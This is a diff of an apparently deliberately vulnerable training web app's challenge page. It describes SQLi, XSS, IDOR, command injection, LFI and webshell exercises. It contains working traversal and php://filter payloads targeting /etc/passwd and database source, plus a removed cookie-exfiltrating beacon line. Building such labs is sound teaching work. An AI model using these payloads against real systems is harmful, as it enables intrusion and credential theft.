@@ -44,7 +44,7 @@ footer{max-width:900px;margin:10px auto 50px;padding:14px 16px;color:var(--muted
 
 <!-- Login: SQLi bypass + weak creds -->
 <div class="card"><h2><code>login.php</code> <span class="flag-pill">🏁 SQLi auth-bypass</span> <span class="flag-pill">weak creds</span></h2>
-  <p class="muted">Log in without a password — inject the <b>username</b> field. The filter escalates per level.</p>
+  <p class="muted">The login query is built straight from your input with no sanitisation → SQL injection. <b>Goal:</b> log in as <code>admin</code> without knowing the password. The input filter gets stricter each level, and some accounts also use weak/guessable passwords.</p>
   <div class="levels" id="lv_login"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('login','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('login','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('login','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('login','expert')">Expert</button></div>
   <details><summary>💡 hint — <span class="note" id="note_login"></span></summary><code class="pl" id="pl_login"></code>
     <button type="button" class="ghost" onclick="document.getElementById('in_lu').value=document.getElementById('pl_login').textContent;document.getElementById('in_lp').value='x';document.getElementById('in_lu').dispatchEvent(new Event('input'))">use this ▶</button>
@@ -57,7 +57,7 @@ footer{max-width:900px;margin:10px auto 50px;padding:14px 16px;color:var(--muted
 
 <!-- Search: UNION SQLi (leveled) -->
 <div class="card"><h2><code>home.php?q=</code> <span class="flag-pill">🏁 UNION SQLi</span> <span class="flag-pill">🏁 reflected XSS</span></h2>
-  <p class="muted">Two bugs share this box. <b>SQLi</b> (use SQLi ▶) → read the <b>✓/✗ match</b> result below (expert is blind). <b>Reflected XSS</b> (use XSS ▶) → the payload breaks out of the search field and an <b>alert pops</b>; ignore the match line. Both filters escalate per level.</p>
+  <p class="muted">One search box, two bugs. <b>UNION SQLi</b> — your input is concatenated into the query, so you can read data straight from the database. <b>Reflected XSS</b> — the same input is echoed back into the page unescaped, so your markup runs in the browser. <b>Goal:</b> dump a secret from the DB, or get script to run in the page. Both filters escalate per level; the expert SQLi level is blind (TRUE/FALSE only).</p>
   <div class="levels" id="lv_q"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('q','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('q','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('q','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('q','expert')">Expert</button></div>
   <details><summary>💡 hint — <span class="note" id="note_q"></span></summary>
     <code class="pl" id="pl_q"></code><button type="button" class="ghost" onclick="fill('in_q','pl_q')">use SQLi ▶</button>
@@ -69,7 +69,7 @@ footer{max-width:900px;margin:10px auto 50px;padding:14px 16px;color:var(--muted
 
 <!-- Guestbook: stored XSS (leveled) -->
 <div class="card"><h2><code>index.php</code> guestbook <span class="flag-pill">🏁 stored XSS</span></h2>
-  <p class="muted">Post a comment; it's rendered to every visitor through the level's display filter. The page sets a non-HttpOnly <code>flag</code> cookie — swap <code>alert()</code> for a beacon (<code>new Image().src='http://127.0.0.1:9001/?c='+document.cookie</code>) to steal it.</p>
+  <p class="muted">Your comment is <b>stored</b> and rendered to <b>every</b> visitor through the level's output filter, so injected markup runs in their browser — not just yours. The page sets a <b>non-HttpOnly</b> <code>flag</code> cookie. <b>Goal:</b> get your script to run and steal that cookie. The filter escalates per level.</p>
   <div class="levels" id="lv_gb"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('gb','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('gb','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('gb','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('gb','expert')">Expert</button></div>
   <details><summary>💡 hint — <span class="note" id="note_gb"></span></summary>
     <code class="pl" id="pl_gb"></code><button type="button" class="ghost" onclick="fill('in_gb','pl_gb')">use this ▶</button></details>
@@ -81,7 +81,7 @@ footer{max-width:900px;margin:10px auto 50px;padding:14px 16px;color:var(--muted
 
 <!-- Profile: IDOR (leveled) -->
 <div class="card"><h2><code>profile.php?id=</code> <span class="flag-pill">🏁 IDOR</span></h2>
-  <p class="muted">No ownership check. The id reference gets more obfuscated each level — all still forgeable. (1 = admin.) Each record's <b>note is encoded harder</b>: id 1 plaintext flag · id 2 base64 · id 3 unsalted sha1 · id 4 salted md5 — read them all and decode/crack each.</p>
+  <p class="muted">The profile shown is chosen from the <code>id</code> in your request, with <b>no check that you own it</b> → IDOR: change the id to read <b>other users'</b> records. The id reference is obfuscated a little more each level (but always forgeable), and each record's note is stored in a progressively harder form (plaintext → base64 → hash → salted hash), so recovering them all is decode/crack practice.</p>
   <div class="levels" id="lv_id"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('id','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('id','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('id','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('id','expert')">Expert</button></div>
   <details><summary>💡 hint — <span class="note" id="note_id"></span></summary>
     <code class="pl" id="pl_id"></code><button type="button" class="ghost" onclick="fill('in_id','pl_id')">use this ▶</button></details>
@@ -98,7 +98,7 @@ footer{max-width:900px;margin:10px auto 50px;padding:14px 16px;color:var(--muted
 
 <!-- Net Tools: command injection (leveled) -->
 <div class="card"><h2><code>tools.php?host=</code> <span class="flag-pill">🏁 command injection</span></h2>
-  <p class="muted">The host is passed to a shell <code>ping</code>. Run your own command; the filter escalates.</p>
+  <p class="muted">Your input is placed directly into a shell <code>ping</code> command → command injection (RCE). <b>Goal:</b> run your own commands on the host and read the flag. The character filter gets stricter each level, and the expert level returns no output (blind — you exfiltrate another way).</p>
   <div class="levels" id="lv_cmd"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('cmd','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('cmd','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('cmd','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('cmd','expert')">Expert</button></div>
   <details><summary>💡 hint — <span class="note" id="note_cmd"></span></summary>
     <code class="pl" id="pl_cmd"></code><button type="button" class="ghost" onclick="fill('in_cmd','pl_cmd')">use this ▶</button></details>
@@ -114,7 +114,7 @@ footer{max-width:900px;margin:10px auto 50px;padding:14px 16px;color:var(--muted
 
 <!-- Page: LFI (leveled) -->
 <div class="card"><h2><code>home.php?page=</code> <span class="flag-pill">🏁 LFI / path traversal</span></h2>
-  <p class="muted">Includes <code>pages/&lt;name&gt;</code>. Read <code>lfi_secret/flag.txt</code> (outside the web root). Filter escalates (hard→<code>php://filter</code> base64, expert→rot13 — decode the output). Same dir also has <code>flag_b64.txt</code> (base64) and <code>flag_salted.txt</code> (salted md5 → <code>hashcat -m 10</code> → monkey) for decode/crack practice.</p>
+  <p class="muted">The <code>page</code> parameter is included from the <code>pages/</code> folder with no sanitisation → local file inclusion / traversal. <b>Goal:</b> make the app read a file it shouldn't — including the secret <b>outside</b> the web root. The filter gets stricter each level, and the higher levels hand the file back <b>encoded</b> (decoding what you retrieve is part of the exercise).</p>
   <div class="levels" id="lv_pg"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('pg','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('pg','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('pg','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('pg','expert')">Expert</button></div>
   <details><summary>💡 hint — <span class="note" id="note_pg"></span></summary>
     <code class="pl" id="pl_pg"></code><button type="button" class="ghost" onclick="fill('in_pg','pl_pg')">use this ▶</button></details>
@@ -125,7 +125,7 @@ footer{max-width:900px;margin:10px auto 50px;padding:14px 16px;color:var(--muted
 
 <!-- Upload: webshell (leveled) -->
 <div class="card"><h2><code>upload.php</code> → <code>uploads/</code> <span class="flag-pill">🏁 upload → RCE</span></h2>
-  <p class="muted">Upload a PHP webshell, then use it for real post-exploitation. The content filter escalates each level (system → passthru → backticks → split-name), and each level's suggested command shows a different thing you'd actually do with RCE: <b>who am I → enumerate users → loot credentials → exfiltrate the secret</b>.</p>
+  <p class="muted">The upload has no real validation, so you can store a PHP <b>webshell</b> under the web root and execute it → RCE. <b>Goal:</b> get code execution, then use it to read the flag. The content filter gets stricter each level, and the flag you retrieve is in a harder form each level (decode/crack it).</p>
   <div class="levels" id="lv_up"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('up','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('up','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('up','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('up','expert')">Expert</button></div>
   <input type="hidden" id="lvl_up" value="easy">
   <p class="note" id="note_up"></p>
@@ -151,22 +151,20 @@ footer{max-width:900px;margin:10px auto 50px;padding:14px 16px;color:var(--muted
 
 <!-- Info disclosure (leveled) -->
 <div class="card"><h2>Information disclosure <span class="flag-pill">🏁 config backup</span></h2>
-  <p class="muted">This app leaks files it shouldn't. <b>Find the hidden paths yourself</b>: start at
-    <a href="robots.txt" target="_blank">/robots.txt</a>, follow the breadcrumbs (<code>/.well-known/security.txt</code>
-    → the deployment notes under <code>/private/</code>), or fuzz with <code>feroxbuster</code>/<code>ffuf</code>
-    (the app 200s almost everything, so filter the wildcard). A dropped backup leaks the admin credential —
-    but in a <b>harder form each level</b>: plaintext → base64 → unsalted hash → salted hash. Recover it.
-    <i>(a browser hides <code>&lt;?php?&gt;</code> — use View Source / Ctrl+U, or <code>curl</code>.)</i></p>
+  <p class="muted">Sensitive files were left reachable that shouldn't be (a config backup, old credential dumps).
+    <b>Goal:</b> discover the hidden paths yourself — a classic first stop is
+    <a href="robots.txt" target="_blank">/robots.txt</a>, otherwise enumerate/fuzz the server
+    (feroxbuster/ffuf) — and recover the leaked admin credential. It's left in a <b>harder form each level</b>
+    (plaintext → base64 → unsalted hash → salted hash), so decode/crack what you find.</p>
   <div class="levels" id="lv_disc"><button type="button" class="lvlbtn" data-l="easy" onclick="setLvl('disc','easy')">Easy</button><button type="button" class="lvlbtn" data-l="medium" onclick="setLvl('disc','medium')">Medium</button><button type="button" class="lvlbtn" data-l="hard" onclick="setLvl('disc','hard')">Hard</button><button type="button" class="lvlbtn" data-l="expert" onclick="setLvl('disc','expert')">Expert</button></div>
   <details><summary>💡 hint — <span class="note" id="note_disc"></span></summary><code class="pl" id="pl_disc"></code></details>
 </div>
 
 <!-- CSP -->
 <div class="card"><h2>Weak CSP <span class="flag-pill">analysis</span></h2>
-  <p class="muted">Read the policy and the cookie in the browser: <b>DevTools (F12) → Network</b> → reload →
-  click the document → <b>Response Headers</b> (the <code>Content-Security-Policy</code>), and
-  <b>Console</b> → <code>document.cookie</code> (the <code>flag</code> cookie — proves it's not HttpOnly).
-  <code>'unsafe-inline'</code> makes the stored-XSS cookie theft above work despite the CSP.</p></div>
+  <p class="muted">This page ships a <code>Content-Security-Policy</code> — but is it actually protective? Inspect the
+  response headers and the cookie flags in your browser's DevTools. <b>Goal:</b> judge whether this CSP really
+  prevents the stored-XSS cookie theft from the guestbook, and explain why or why not. (Analysis — no flag.)</p></div>
 
 </div>
 <footer>⚠️ <b>Intentionally vulnerable — training only.</b> Run locally / isolated lab; never expose it.</footer>
@@ -194,7 +192,7 @@ const PAYLOADS = {
  pg:{
   easy:{p:"../../lfi_secret/flag.txt", n:"Easy — raw traversal. Goal: read a file OUTSIDE the web root (the secret flag)."},
   medium:{p:"....//....//....//....//....//....//....//....//etc/passwd", n:"Medium — '../' stripped once → ....//. Goal: climb to / and read a system file (/etc/passwd = the user list)."},
-  hard:{p:"php://filter/convert.base64-encode/resource=db.php", n:"Hard — '../' stripped recursively (....// dies) → php://filter wrapper. Goal: SOURCE DISCLOSURE — base64-decode db.php to read the app's DB credentials."},
+  hard:{p:"php://filter/convert.base64-encode/resource=db.php", n:"Hard — '../' stripped recursively (....// dies) → php://filter wrapper. Goal: SOURCE DISCLOSURE — base64-decode a .php file to read its source. How you'd know db.php exists: first filter-read a page you KNOW is there (e.g. home.php) — its require/include lines name the other files (db.php, levels.php…). Or fuzz common names (db.php/config.php)."},
   expert:{p:"php://filter/read=string.rot13/resource=../lfi_secret/flag.txt", n:"Expert — + 'base64' blocked → string.rot13 filter. Goal: still exfiltrate the flag; rot13 the output back."}
  }
 };
